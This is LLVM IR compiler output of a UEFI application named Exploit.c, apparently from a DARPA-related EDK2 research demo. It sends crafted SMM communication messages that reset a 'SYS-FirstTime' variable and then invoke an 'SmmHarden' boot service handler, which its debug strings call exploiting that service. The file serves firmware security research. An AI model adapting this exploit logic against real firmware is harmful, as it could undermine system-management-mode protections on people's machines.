; ModuleID = './Build/OvmfX64/DEBUG_CLANGPDB/X64/MdeModulePkg/Application/Exploit/Exploit/OUTPUT/Exploit.obj'
source_filename = "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2/MdeModulePkg/Application/Exploit/Exploit.c"
target datalayout = "e-m:w-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-windows-gnu"

%struct.EFI_BOOT_SERVICES = type { %struct.EFI_TABLE_HEADER, i64 (i64)*, void (i64)*, i64 (i32, i32, i64, i64*)*, i64 (i64, i64)*, i64 (i64*, %struct.EFI_MEMORY_DESCRIPTOR*, i64*, i64*, i32*)*, i64 (i32, i64, i8**)*, i64 (i8*)*, i64 (i32, i64, void (i8*, i8*)*, i8*, i8**)*, i64 (i8*, i32, i64)*, i64 (i64, i8**, i64*)*, i64 (i8*)*, i64 (i8*)*, i64 (i8*)*, i64 (i8**, %struct.GUID*, i32, i8*)*, i64 (i8*, %struct.GUID*, i8*, i8*)*, i64 (i8*, %struct.GUID*, i8*)*, i64 (i8*, %struct.GUID*, i8**)*, i8*, i64 (%struct.GUID*, i8*, i8**)*, i64 (i32, %struct.GUID*, i8*, i64*, i8**)*, i64 (%struct.GUID*, %struct.EFI_DEVICE_PATH_PROTOCOL**, i8**)*, i64 (%struct.GUID*, i8*)*, i64 (i8, i8*, %struct.EFI_DEVICE_PATH_PROTOCOL*, i8*, i64, i8**)*, i64 (i8*, i64*, i16**)*, i64 (i8*, i64, i64, i16*)*, i64 (i8*)*, i64 (i8*, i64)*, i64 (i64*)*, i64 (i64)*, i64 (i64, i64, i64, i16*)*, i64 (i8*, i8**, %struct.EFI_DEVICE_PATH_PROTOCOL*, i8)*, i64 (i8*, i8*, i8*)*, i64 (i8*, %struct.GUID*, i8**, i8*, i8*, i32)*, i64 (i8*, %struct.GUID*, i8*, i8*)*, i64 (i8*, %struct.GUID*, %struct.EFI_OPEN_PROTOCOL_INFORMATION_ENTRY**, i64*)*, i64 (i8*, %struct.GUID***, i64*)*, i64 (i32, %struct.GUID*, i8*, i64*, i8***)*, i64 (%struct.GUID*, i8*, i8**)*, i64 (i8**, ...)*, i64 (i8*, ...)*, i64 (i8*, i64, i32*)*, void (i8*, i8*, i64)*, void (i8*, i64, i8)*, i64 (i32, i64, void (i8*, i8*)*, i8*, %struct.GUID*, i8**)* }
%struct.EFI_TABLE_HEADER = type { i64, i32, i32, i32, i32 }
%struct.EFI_MEMORY_DESCRIPTOR = type { i32, i64, i64, i64, i64 }
%struct.GUID = type { i32, i16, i16, [8 x i8] }
%struct.EFI_DEVICE_PATH_PROTOCOL = type { i8, i8, [2 x i8] }
%struct.EFI_OPEN_PROTOCOL_INFORMATION_ENTRY = type { i8*, i8*, i32, i32 }
%struct._EFI_MM_COMMUNICATION_PROTOCOL = type { i64 (%struct._EFI_MM_COMMUNICATION_PROTOCOL*, i8*, i64*)* }
%struct.EFI_SYSTEM_TABLE = type { %struct.EFI_TABLE_HEADER, i16*, i32, i8*, %struct._EFI_SIMPLE_TEXT_INPUT_PROTOCOL*, i8*, %struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*, i8*, %struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*, %struct.EFI_RUNTIME_SERVICES*, %struct.EFI_BOOT_SERVICES*, i64, %struct.EFI_CONFIGURATION_TABLE* }
%struct._EFI_SIMPLE_TEXT_INPUT_PROTOCOL = type { i64 (%struct._EFI_SIMPLE_TEXT_INPUT_PROTOCOL*, i8)*, i64 (%struct._EFI_SIMPLE_TEXT_INPUT_PROTOCOL*, %struct.EFI_INPUT_KEY*)*, i8* }
%struct.EFI_INPUT_KEY = type { i16, i16 }
%struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL = type { i64 (%struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*, i8)*, i64 (%struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*, i16*)*, i64 (%struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*, i16*)*, i64 (%struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*, i64, i64*, i64*)*, i64 (%struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*, i64)*, i64 (%struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*, i64)*, i64 (%struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*)*, i64 (%struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*, i64, i64)*, i64 (%struct._EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL*, i8)*, %struct.EFI_SIMPLE_TEXT_OUTPUT_MODE* }
%struct.EFI_SIMPLE_TEXT_OUTPUT_MODE = type { i32, i32, i32, i32, i32, i8 }
%struct.EFI_RUNTIME_SERVICES = type { %struct.EFI_TABLE_HEADER, i64 (%struct.EFI_TIME*, %struct.EFI_TIME_CAPABILITIES*)*, i64 (%struct.EFI_TIME*)*, i64 (i8*, i8*, %struct.EFI_TIME*)*, i64 (i8, %struct.EFI_TIME*)*, i64 (i64, i64, i32, %struct.EFI_MEMORY_DESCRIPTOR*)*, i64 (i64, i8**)*, i64 (i16*, %struct.GUID*, i32*, i64*, i8*)*, i64 (i64*, i16*, %struct.GUID*)*, i64 (i16*, %struct.GUID*, i32, i64, i8*)*, i64 (i32*)*, void (i32, i64, i64, i8*)*, i64 (%struct.EFI_CAPSULE_HEADER**, i64, i64)*, i64 (%struct.EFI_CAPSULE_HEADER**, i64, i64*, i32*)*, i64 (i32, i64*, i64*, i64*)* }
%struct.EFI_TIME = type { i16, i8, i8, i8, i8, i8, i8, i32, i16, i8, i8 }
%struct.EFI_TIME_CAPABILITIES = type { i32, i32, i8 }
%struct.EFI_CAPSULE_HEADER = type { %struct.GUID, i32, i32, i32 }
%struct.EFI_CONFIGURATION_TABLE = type { %struct.GUID, i8* }

@gBS = external hidden local_unnamed_addr global %struct.EFI_BOOT_SERVICES*, align 8
@gEfiSmmCommunicationProtocolGuid = external hidden global %struct.GUID, align 4
@.str = private unnamed_addr constant [33 x i8] c"\0AASSERT_EFI_ERROR (Status = %r)\0A\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"Exploit.c\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"!(((INTN)(RETURN_STATUS)(Status)) < 0)\00", align 1
@.str.3 = private unnamed_addr constant [44 x i8] c"[HardenExploit] Setting SYS-FirstTime to 0\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i16] [i16 83, i16 89, i16 83, i16 45, i16 70, i16 105, i16 114, i16 115, i16 116, i16 84, i16 105, i16 109, i16 101, i16 0], align 2
@.str.5 = private unnamed_addr constant [17 x i16] [i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 48, i16 0], align 2
@gEfiSmmHardenVariableManagerGuid = external hidden local_unnamed_addr global %struct.GUID, align 4
@.str.6 = private unnamed_addr constant [52 x i8] c"[HardenExploit] Exploiting SmmHarden Boot Service!\0A\00", align 1
@gEfiSmmHardenBootServiceGuid = external hidden local_unnamed_addr global %struct.GUID, align 4

; Function Attrs: minsize noimplicitfloat noredzone nounwind optsize uwtable
define hidden void @CommunicateSMM(%struct.GUID* nocapture readonly %Guid, i8* %Data, i64 %DataSize) local_unnamed_addr #0 !dbg !71 {
entry:
  %SmmCommunication = alloca %struct._EFI_MM_COMMUNICATION_PROTOCOL*, align 8
  call void @llvm.dbg.declare(metadata %struct.GUID* %Guid, metadata !92, metadata !DIExpression()), !dbg !125
  call void @llvm.dbg.value(metadata i8* %Data, metadata !93, metadata !DIExpression()), !dbg !126
  call void @llvm.dbg.value(metadata i64 %DataSize, metadata !94, metadata !DIExpression()), !dbg !126
  %0 = bitcast %struct._EFI_MM_COMMUNICATION_PROTOCOL** %SmmCommunication to i8*, !dbg !127
  call void @llvm.lifetime.start.p0i8(i64 8, i8* nonnull %0) #4, !dbg !127
  call void @llvm.dbg.value(metadata %struct._EFI_MM_COMMUNICATION_PROTOCOL* null, metadata !97, metadata !DIExpression()), !dbg !126
  store %struct._EFI_MM_COMMUNICATION_PROTOCOL* null, %struct._EFI_MM_COMMUNICATION_PROTOCOL** %SmmCommunication, align 8, !dbg !127
  %1 = load %struct.EFI_BOOT_SERVICES*, %struct.EFI_BOOT_SERVICES** @gBS, align 8, !dbg !128
  %LocateProtocol = getelementptr inbounds %struct.EFI_BOOT_SERVICES, %struct.EFI_BOOT_SERVICES* %1, i64 0, i32 38, !dbg !128
  %2 = load i64 (%struct.GUID*, i8*, i8**)*, i64 (%struct.GUID*, i8*, i8**)** %LocateProtocol, align 8, !dbg !128
  %3 = bitcast %struct._EFI_MM_COMMUNICATION_PROTOCOL** %SmmCommunication to i8**, !dbg !128
  call void @llvm.dbg.value(metadata %struct._EFI_MM_COMMUNICATION_PROTOCOL** %SmmCommunication, metadata !97, metadata !DIExpression(DW_OP_deref)), !dbg !126
  %call = call i64 %2(%struct.GUID* nonnull @gEfiSmmCommunicationProtocolGuid, i8* null, i8** nonnull %3) #5, !dbg !128
  call void @llvm.dbg.value(metadata i64 %call, metadata !95, metadata !DIExpression()), !dbg !126
  %call1 = call i8 @DebugAssertEnabled() #5, !dbg !129
  %tobool = icmp ne i8 %call1, 0, !dbg !129
  %cmp = icmp slt i64 %call, 0
  %or.cond = and i1 %cmp, %tobool, !dbg !129
  br i1 %or.cond, label %do.body3, label %do.end17, !dbg !129

do.body3:                                         ; preds = %entry
  %call4 = call i8 @DebugPrintEnabled() #5, !dbg !131
  %tobool5.not = icmp eq i8 %call4, 0, !dbg !131
  br i1 %tobool5.not, label %do.end13, label %do.body7, !dbg !131

do.body7:                                         ; preds = %do.body3
  %call8 = call i8 @DebugPrintLevelEnabled(i64 2147483648) #5, !dbg !137
  %tobool9.not = icmp eq i8 %call8, 0, !dbg !137
  br i1 %tobool9.not, label %do.end13, label %if.then10, !dbg !137

if.then10:                                        ; preds = %do.body7
  call void (i64, i8*, ...) @DebugPrint(i64 2147483648, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0), i64 %call) #5, !dbg !141
  br label %do.end13, !dbg !141

do.end13:                                         ; preds = %if.then10, %do.body7, %do.body3
  call void @DebugAssert(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i64 27, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0)) #5, !dbg !144
  br label %do.end17, !dbg !144

do.end17:                                         ; preds = %do.end13, %entry
  %add = add i64 %DataSize, 25, !dbg !145
  %call18 = call i8* @AllocateRuntimeZeroPool(i64 %add) #5, !dbg !145
  call void @llvm.dbg.value(metadata i8* %call18, metadata !113, metadata !DIExpression()), !dbg !126
  %4 = bitcast %struct.GUID* %Guid to i8*, !dbg !146
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull align 1 dereferenceable(16) %call18, i8* nonnull align 4 dereferenceable(16) %4, i64 16, i1 false), !dbg !146
  %MessageLength = getelementptr inbounds i8, i8* %call18, i64 16, !dbg !147
  %5 = bitcast i8* %MessageLength to i64*, !dbg !147
  store i64 %DataSize, i64* %5, align 1, !dbg !147
  %Data19 = getelementptr inbounds i8, i8* %call18, i64 24, !dbg !148
  %call20 = call i8* @CopyMem(i8* nonnull %Data19, i8* %Data, i64 %DataSize) #5, !dbg !148
  %6 = load %struct._EFI_MM_COMMUNICATION_PROTOCOL*, %struct._EFI_MM_COMMUNICATION_PROTOCOL** %SmmCommunication, align 8, !dbg !149
  call void @llvm.dbg.value(metadata %struct._EFI_MM_COMMUNICATION_PROTOCOL* %6, metadata !97, metadata !DIExpression()), !dbg !126
  %Communicate = getelementptr inbounds %struct._EFI_MM_COMMUNICATION_PROTOCOL, %struct._EFI_MM_COMMUNICATION_PROTOCOL* %6, i64 0, i32 0, !dbg !149
  %7 = load i64 (%struct._EFI_MM_COMMUNICATION_PROTOCOL*, i8*, i64*)*, i64 (%struct._EFI_MM_COMMUNICATION_PROTOCOL*, i8*, i64*)** %Communicate, align 8, !dbg !149
  %call21 = call i64 %7(%struct._EFI_MM_COMMUNICATION_PROTOCOL* %6, i8* %call18, i64* null) #5, !dbg !149
  call void @FreePool(i8* %call18) #5, !dbg !150
  call void @llvm.lifetime.end.p0i8(i64 8, i8* nonnull %0) #4, !dbg !151
  ret void, !dbg !151
}

; Function Attrs: nofree nosync nounwind readnone speculatable willreturn
declare void @llvm.dbg.declare(metadata, metadata, metadata) #1

; Function Attrs: argmemonly nofree nosync nounwind willreturn
declare void @llvm.lifetime.start.p0i8(i64 immarg, i8* nocapture) #2

; Function Attrs: minsize noimplicitfloat noredzone optsize
declare hidden i8 @DebugAssertEnabled() local_unnamed_addr #3

; Function Attrs: minsize noimplicitfloat noredzone optsize
declare hidden i8 @DebugPrintEnabled() local_unnamed_addr #3

; Function Attrs: minsize noimplicitfloat noredzone optsize
declare hidden i8 @DebugPrintLevelEnabled(i64) local_unnamed_addr #3

; Function Attrs: minsize noimplicitfloat noredzone optsize
declare hidden void @DebugPrint(i64, i8*, ...) local_unnamed_addr #3

; Function Attrs: minsize noimplicitfloat noredzone optsize
declare hidden void @DebugAssert(i8*, i64, i8*) local_unnamed_addr #3

; Function Attrs: minsize noimplicitfloat noredzone optsize
declare hidden i8* @AllocateRuntimeZeroPool(i64) local_unnamed_addr #3

; Function Attrs: argmemonly nofree nosync nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

; Function Attrs: minsize noimplicitfloat noredzone optsize
declare hidden i8* @CopyMem(i8*, i8*, i64) local_unnamed_addr #3

; Function Attrs: minsize noimplicitfloat noredzone optsize
declare hidden void @FreePool(i8*) local_unnamed_addr #3

; Function Attrs: argmemonly nofree nosync nounwind willreturn
declare void @llvm.lifetime.end.p0i8(i64 immarg, i8* nocapture) #2

; Function Attrs: minsize noimplicitfloat noredzone nounwind optsize uwtable
define hidden i64 @UefiMain(i8* nocapture readnone %ImageHandle, %struct.EFI_SYSTEM_TABLE* nocapture readnone %SystemTable) local_unnamed_addr #0 !dbg !152 {
entry:
  %Buffer = alloca [32 x i16], align 16
  %byval-temp = alloca %struct.GUID, align 4
  %byval-temp28 = alloca %struct.GUID, align 4
  call void @llvm.dbg.value(metadata i8* %ImageHandle, metadata !649, metadata !DIExpression()), !dbg !657
  call void @llvm.dbg.value(metadata %struct.EFI_SYSTEM_TABLE* %SystemTable, metadata !650, metadata !DIExpression()), !dbg !657
  %call = tail call i8 @DebugPrintEnabled() #5, !dbg !658
  %tobool.not = icmp eq i8 %call, 0, !dbg !658
  br i1 %tobool.not, label %do.end6, label %do.body1, !dbg !658

do.body1:                                         ; preds = %entry
  %call2 = tail call i8 @DebugPrintLevelEnabled(i64 64) #5, !dbg !660
  %tobool3.not = icmp eq i8 %call2, 0, !dbg !660
  br i1 %tobool3.not, label %do.end6, label %if.then4, !dbg !660

if.then4:                                         ; preds = %do.body1
  tail call void (i64, i8*, ...) @DebugPrint(i64 64, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.3, i64 0, i64 0)) #5, !dbg !664
  br label %do.end6, !dbg !664

do.end6:                                          ; preds = %if.then4, %do.body1, %entry
  call void @llvm.dbg.value(metadata i16* getelementptr inbounds ([14 x i16], [14 x i16]* @.str.4, i64 0, i64 0), metadata !651, metadata !DIExpression()), !dbg !657
  call void @llvm.dbg.value(metadata i16* getelementptr inbounds ([17 x i16], [17 x i16]* @.str.5, i64 0, i64 0), metadata !652, metadata !DIExpression()), !dbg !657
  %0 = bitcast [32 x i16]* %Buffer to i8*, !dbg !667
  call void @llvm.lifetime.start.p0i8(i64 64, i8* nonnull %0) #4, !dbg !667
  call void @llvm.dbg.declare(metadata [32 x i16]* %Buffer, metadata !653, metadata !DIExpression()), !dbg !667
  %call7 = tail call i64 @StrSize(i16* getelementptr inbounds ([14 x i16], [14 x i16]* @.str.4, i64 0, i64 0)) #5, !dbg !668
  %call8 = call i8* @CopyMem(i8* nonnull %0, i8* bitcast ([14 x i16]* @.str.4 to i8*), i64 %call7) #5, !dbg !668
  %call10 = call i64 @StrLen(i16* getelementptr inbounds ([14 x i16], [14 x i16]* @.str.4, i64 0, i64 0)) #5, !dbg !669
  %add.ptr = getelementptr inbounds [32 x i16], [32 x i16]* %Buffer, i64 0, i64 %call10, !dbg !669
  %add.ptr11 = getelementptr inbounds i16, i16* %add.ptr, i64 1, !dbg !669
  %1 = bitcast i16* %add.ptr11 to i8*, !dbg !669
  %call12 = call i64 @StrSize(i16* getelementptr inbounds ([17 x i16], [17 x i16]* @.str.5, i64 0, i64 0)) #5, !dbg !669
  %call13 = call i8* @CopyMem(i8* nonnull %1, i8* bitcast ([17 x i16]* @.str.5 to i8*), i64 %call12) #5, !dbg !669
  %2 = bitcast %struct.GUID* %byval-temp to i8*, !dbg !670
  call void @llvm.lifetime.start.p0i8(i64 16, i8* nonnull %2) #4, !dbg !670
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull align 4 dereferenceable(16) %2, i8* nonnull align 4 dereferenceable(16) bitcast (%struct.GUID* @gEfiSmmHardenVariableManagerGuid to i8*), i64 16, i1 false), !dbg !670
  call void @CommunicateSMM(%struct.GUID* nonnull %byval-temp, i8* nonnull %0, i64 64) #6, !dbg !670
  call void @llvm.lifetime.end.p0i8(i64 16, i8* nonnull %2) #4, !dbg !670
  %call16 = call i8 @DebugPrintEnabled() #5, !dbg !671
  %tobool17.not = icmp eq i8 %call16, 0, !dbg !671
  br i1 %tobool17.not, label %do.end27, label %do.body19, !dbg !671

do.body19:                                        ; preds = %do.end6
  %call20 = call i8 @DebugPrintLevelEnabled(i64 64) #5, !dbg !673
  %tobool21.not = icmp eq i8 %call20, 0, !dbg !673
  br i1 %tobool21.not, label %do.end27, label %if.then22, !dbg !673

if.then22:                                        ; preds = %do.body19
  call void (i64, i8*, ...) @DebugPrint(i64 64, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.6, i64 0, i64 0)) #5, !dbg !677
  br label %do.end27, !dbg !677

do.end27:                                         ; preds = %if.then22, %do.body19, %do.end6
  %3 = bitcast %struct.GUID* %byval-temp28 to i8*, !dbg !680
  call void @llvm.lifetime.start.p0i8(i64 16, i8* nonnull %3) #4, !dbg !680
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull align 4 dereferenceable(16) %3, i8* nonnull align 4 dereferenceable(16) bitcast (%struct.GUID* @gEfiSmmHardenBootServiceGuid to i8*), i64 16, i1 false), !dbg !680
  call void @CommunicateSMM(%struct.GUID* nonnull %byval-temp28, i8* null, i64 0) #6, !dbg !680
  call void @llvm.lifetime.end.p0i8(i64 16, i8* nonnull %3) #4, !dbg !680
  call void @llvm.lifetime.end.p0i8(i64 64, i8* nonnull %0) #4, !dbg !681
  ret i64 0, !dbg !682
}

; Function Attrs: minsize noimplicitfloat noredzone optsize
declare hidden i64 @StrSize(i16*) local_unnamed_addr #3

; Function Attrs: minsize noimplicitfloat noredzone optsize
declare hidden i64 @StrLen(i16*) local_unnamed_addr #3

; Function Attrs: nofree nosync nounwind readnone speculatable willreturn
declare void @llvm.dbg.value(metadata, metadata, metadata) #1

attributes #0 = { minsize noimplicitfloat noredzone nounwind optsize uwtable "disable-tail-calls"="false" "frame-pointer"="none" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-builtins" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-stack-arg-probe" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nofree nosync nounwind readnone speculatable willreturn }
attributes #2 = { argmemonly nofree nosync nounwind willreturn }
attributes #3 = { minsize noimplicitfloat noredzone optsize "disable-tail-calls"="false" "frame-pointer"="none" "less-precise-fpmad"="false" "no-builtins" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind }
attributes #5 = { minsize nobuiltin noimplicitfloat noredzone nounwind optsize "no-builtins" "trap-func-name"="undefined_behavior_has_been_optimized_away_by_clang" }
attributes #6 = { minsize nobuiltin noimplicitfloat noredzone optsize "no-builtins" "trap-func-name"="undefined_behavior_has_been_optimized_away_by_clang" }

!llvm.dbg.cu = !{!0}
!llvm.module.flags = !{!63, !64, !65, !66, !67, !68, !69}
!llvm.ident = !{!70}

!0 = distinct !DICompileUnit(language: DW_LANG_C99, file: !1, producer: "clang version 12.0.0 (https://github.com/checkedc-purdue/checkedc-llvm-project.git 27fde796053109cdd0b9787c7168cab042e1ea94)", isOptimized: true, runtimeVersion: 0, emissionKind: FullDebug, enums: !2, retainedTypes: !49, nameTableKind: None)
!1 = !DIFile(filename: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2/MdeModulePkg/Application/Exploit/Exploit.c", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2/Build/OvmfX64/DEBUG_CLANGPDB/X64/MdeModulePkg/Application/Exploit/Exploit", checksumkind: CSK_MD5, checksum: "2eaa23cdb826da2e95edfc5d471a7e94")
!2 = !{!3, !11, !18, !36, !41, !44}
!3 = !DICompositeType(tag: DW_TAG_enumeration_type, file: !4, line: 112, baseType: !5, size: 32, elements: !6)
!4 = !DIFile(filename: "MdePkg/Include/Uefi/UefiMultiPhase.h", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "9fedf5a9d80a946901c41e10b663b699")
!5 = !DIBasicType(name: "unsigned int", size: 32, encoding: DW_ATE_unsigned)
!6 = !{!7, !8, !9, !10}
!7 = !DIEnumerator(name: "EfiResetCold", value: 0, isUnsigned: true)
!8 = !DIEnumerator(name: "EfiResetWarm", value: 1, isUnsigned: true)
!9 = !DIEnumerator(name: "EfiResetShutdown", value: 2, isUnsigned: true)
!10 = !DIEnumerator(name: "EfiResetPlatformSpecific", value: 3, isUnsigned: true)
!11 = !DICompositeType(tag: DW_TAG_enumeration_type, file: !12, line: 28, baseType: !5, size: 32, elements: !13)
!12 = !DIFile(filename: "MdePkg/Include/Uefi/UefiSpec.h", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "fa5bca73848c09a5c238d99b530a0ef0")
!13 = !{!14, !15, !16, !17}
!14 = !DIEnumerator(name: "AllocateAnyPages", value: 0, isUnsigned: true)
!15 = !DIEnumerator(name: "AllocateMaxAddress", value: 1, isUnsigned: true)
!16 = !DIEnumerator(name: "AllocateAddress", value: 2, isUnsigned: true)
!17 = !DIEnumerator(name: "MaxAllocateType", value: 3, isUnsigned: true)
!18 = !DICompositeType(tag: DW_TAG_enumeration_type, file: !4, line: 38, baseType: !5, size: 32, elements: !19)
!19 = !{!20, !21, !22, !23, !24, !25, !26, !27, !28, !29, !30, !31, !32, !33, !34, !35}
!20 = !DIEnumerator(name: "EfiReservedMemoryType", value: 0, isUnsigned: true)
!21 = !DIEnumerator(name: "EfiLoaderCode", value: 1, isUnsigned: true)
!22 = !DIEnumerator(name: "EfiLoaderData", value: 2, isUnsigned: true)
!23 = !DIEnumerator(name: "EfiBootServicesCode", value: 3, isUnsigned: true)
!24 = !DIEnumerator(name: "EfiBootServicesData", value: 4, isUnsigned: true)
!25 = !DIEnumerator(name: "EfiRuntimeServicesCode", value: 5, isUnsigned: true)
!26 = !DIEnumerator(name: "EfiRuntimeServicesData", value: 6, isUnsigned: true)
!27 = !DIEnumerator(name: "EfiConventionalMemory", value: 7, isUnsigned: true)
!28 = !DIEnumerator(name: "EfiUnusableMemory", value: 8, isUnsigned: true)
!29 = !DIEnumerator(name: "EfiACPIReclaimMemory", value: 9, isUnsigned: true)
!30 = !DIEnumerator(name: "EfiACPIMemoryNVS", value: 10, isUnsigned: true)
!31 = !DIEnumerator(name: "EfiMemoryMappedIO", value: 11, isUnsigned: true)
!32 = !DIEnumerator(name: "EfiMemoryMappedIOPortSpace", value: 12, isUnsigned: true)
!33 = !DIEnumerator(name: "EfiPalCode", value: 13, isUnsigned: true)
!34 = !DIEnumerator(name: "EfiPersistentMemory", value: 14, isUnsigned: true)
!35 = !DIEnumerator(name: "EfiMaxMemoryType", value: 15, isUnsigned: true)
!36 = !DICompositeType(tag: DW_TAG_enumeration_type, file: !12, line: 505, baseType: !5, size: 32, elements: !37)
!37 = !{!38, !39, !40}
!38 = !DIEnumerator(name: "TimerCancel", value: 0, isUnsigned: true)
!39 = !DIEnumerator(name: "TimerPeriodic", value: 1, isUnsigned: true)
!40 = !DIEnumerator(name: "TimerRelative", value: 2, isUnsigned: true)
!41 = !DICompositeType(tag: DW_TAG_enumeration_type, file: !12, line: 1164, baseType: !5, size: 32, elements: !42)
!42 = !{!43}
!43 = !DIEnumerator(name: "EFI_NATIVE_INTERFACE", value: 0, isUnsigned: true)
!44 = !DICompositeType(tag: DW_TAG_enumeration_type, file: !12, line: 1480, baseType: !5, size: 32, elements: !45)
!45 = !{!46, !47, !48}
!46 = !DIEnumerator(name: "AllHandles", value: 0, isUnsigned: true)
!47 = !DIEnumerator(name: "ByRegisterNotify", value: 1, isUnsigned: true)
!48 = !DIEnumerator(name: "ByProtocol", value: 2, isUnsigned: true)
!49 = !{!50, !51, !52, !56, !61}
!50 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: null, size: 64)
!51 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !50, size: 64)
!52 = !DIDerivedType(tag: DW_TAG_typedef, name: "INTN", file: !53, line: 234, baseType: !54)
!53 = !DIFile(filename: "MdePkg/Include/X64/ProcessorBind.h", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "5a809246aab9e079e163aa7a7e32c6ad")
!54 = !DIDerivedType(tag: DW_TAG_typedef, name: "INT64", file: !53, line: 184, baseType: !55)
!55 = !DIBasicType(name: "long long int", size: 64, encoding: DW_ATE_signed)
!56 = !DIDerivedType(tag: DW_TAG_typedef, name: "RETURN_STATUS", file: !57, line: 922, baseType: !58)
!57 = !DIFile(filename: "MdePkg/Include/Base.h", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "209ade7572d58d3f5493cda290e480db")
!58 = !DIDerivedType(tag: DW_TAG_typedef, name: "UINTN", file: !53, line: 229, baseType: !59)
!59 = !DIDerivedType(tag: DW_TAG_typedef, name: "UINT64", file: !53, line: 180, baseType: !60)
!60 = !DIBasicType(name: "long long unsigned int", size: 64, encoding: DW_ATE_unsigned)
!61 = !DIDerivedType(tag: DW_TAG_typedef, name: "BOOLEAN", file: !53, line: 210, baseType: !62)
!62 = !DIBasicType(name: "unsigned char", size: 8, encoding: DW_ATE_unsigned_char)
!63 = !{i32 2, !"CodeView", i32 1}
!64 = !{i32 2, !"Debug Info Version", i32 3}
!65 = !{i32 1, !"wchar_size", i32 2}
!66 = !{i32 7, !"PIC Level", i32 2}
!67 = !{i32 1, !"Code Model", i32 1}
!68 = !{i32 1, !"ThinLTO", i32 0}
!69 = !{i32 1, !"EnableSplitLTOUnit", i32 1}
!70 = !{!"clang version 12.0.0 (https://github.com/checkedc-purdue/checkedc-llvm-project.git 27fde796053109cdd0b9787c7168cab042e1ea94)"}
!71 = distinct !DISubprogram(name: "CommunicateSMM", scope: !72, file: !72, line: 12, type: !73, scopeLine: 17, flags: DIFlagPrototyped, spFlags: DISPFlagDefinition | DISPFlagOptimized, unit: !0, retainedNodes: !91)
!72 = !DIFile(filename: "MdeModulePkg/Application/Exploit/Exploit.c", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "2eaa23cdb826da2e95edfc5d471a7e94")
!73 = !DISubroutineType(types: !74)
!74 = !{null, !75, !50, !58}
!75 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_GUID", file: !76, line: 24, baseType: !77)
!76 = !DIFile(filename: "MdePkg/Include/Uefi/UefiBaseType.h", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "edcd099fb8334296fb31fb77a7727121")
!77 = !DIDerivedType(tag: DW_TAG_typedef, name: "GUID", file: !57, line: 218, baseType: !78)
!78 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "GUID", file: !57, line: 213, size: 128, elements: !79)
!79 = !{!80, !82, !85, !86}
!80 = !DIDerivedType(tag: DW_TAG_member, name: "Data1", scope: !78, file: !57, line: 214, baseType: !81, size: 32)
!81 = !DIDerivedType(tag: DW_TAG_typedef, name: "UINT32", file: !53, line: 188, baseType: !5)
!82 = !DIDerivedType(tag: DW_TAG_member, name: "Data2", scope: !78, file: !57, line: 215, baseType: !83, size: 16, offset: 32)
!83 = !DIDerivedType(tag: DW_TAG_typedef, name: "UINT16", file: !53, line: 196, baseType: !84)
!84 = !DIBasicType(name: "unsigned short", size: 16, encoding: DW_ATE_unsigned)
!85 = !DIDerivedType(tag: DW_TAG_member, name: "Data3", scope: !78, file: !57, line: 216, baseType: !83, size: 16, offset: 48)
